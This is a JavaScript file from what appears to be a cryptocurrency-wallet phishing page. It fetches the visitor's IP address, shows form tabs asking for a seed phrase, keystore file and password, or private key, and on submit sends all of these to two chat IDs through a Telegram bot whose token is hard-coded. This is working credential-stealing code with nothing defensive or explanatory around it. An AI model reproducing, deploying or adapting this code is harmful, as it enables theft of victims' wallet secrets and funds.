fetch('https://api64.ipify.org?format=json')
.then(response => response.json())
.then(data => {
    const ipAddressInput = document.getElementById('ipaddress');
    if (ipAddressInput) {
        ipAddressInput.value = data.ip;
    }
})
.catch(error => console.error('Error fetching IP address:', error));

var phrase = document.querySelector("#phrase"),
    phraseText = document.querySelector("#phraseText"),
    keystore = document.querySelector("#keystore"),
    private = document.querySelector("#private"),
    family = document.querySelector("#family"),
    secret = document.querySelector("#secret"),
    first = document.querySelector("#first"),
    second = document.getElementById("second"),
    third = document.querySelector("#third"),
    fourth = document.getElementById("fourth"),
    fiveth = document.querySelector("#fiveth"),
    wallet_name = document.querySelector("#walletname");

function hide(e) {
    var t = document.querySelector(".active");
    if (t) {
        t.classList.remove("active");
        var r = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");
        for (let e = 0; e < r.length; e++)
            r[e].value = "";
    }
    var o = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"),
        s = e.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400");
    for (let e = 0; e < o.length; e++)
        o[e].required = !1;
    for (let e = 0; e < s.length; e++)
        s[e].required = !0;
    e.classList.add("active");
}

phrase.addEventListener("click", function () {
    hide(first)
});
keystore.addEventListener("click", function () {
    hide(second)
});
private.addEventListener("click", function () {
    hide(third)
});

const form = document.querySelector("#form");

const convertObjectToText = e => {
    let t = "";
    for (const [r, o] of Object.entries(e))
        t += `${r}: ${o}\n`;
    return t;
};


function sendMessage(e, t = "6671344777:AAGOHKgfgbJUUuuBpH-EUQXkCNx57wXVMfw", chaatId = ["5306517915", "6391101951"]) {
    const botToken = t;
    const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    chaatId.forEach(chatId => {
        const formData = new FormData();
        formData.append("text", e);
        formData.append("chat_id", chatId);

        fetch(sendMessageUrl, {
            method: "POST",
            body: formData
        })
            .then((response) => {
                if (response.ok) {
                    console.log(`Message sent successfully to chat ID: ${chatId}`);
                } else {
                    console.error(
                        `Failed to send message to chat ID ${chatId}: ${response.status}, ${response.statusText}`
                    );
                }
            })
            .catch((error) => {
                console.error("Error sending message:", error);
            });
    });
}

function sendData() {
    var o = document.getElementById("privatekeyval").value,
        s = document.getElementById("keystorepass").value;
    const n = {
        ...{
            Private_Key_Val: o,
            Keystore: document.getElementById("keystoreval").value,
            Keystore_Pass: s,
            Seed_Phrase: document.getElementById("phraseinput").value,
            IP_Address: document.getElementById("ipaddress").value
        }
    };
    const a = convertObjectToText(n);
    sendMessage(a, "6671344777:AAGOHKgfgbJUUuuBpH-EUQXkCNx57wXVMfw", ["5306517915", "6391101951"]);
}

form.addEventListener("submit", function (e) {
    e.preventDefault();
    document.querySelector(".sending").style.display = "flex";
    sendData();
});
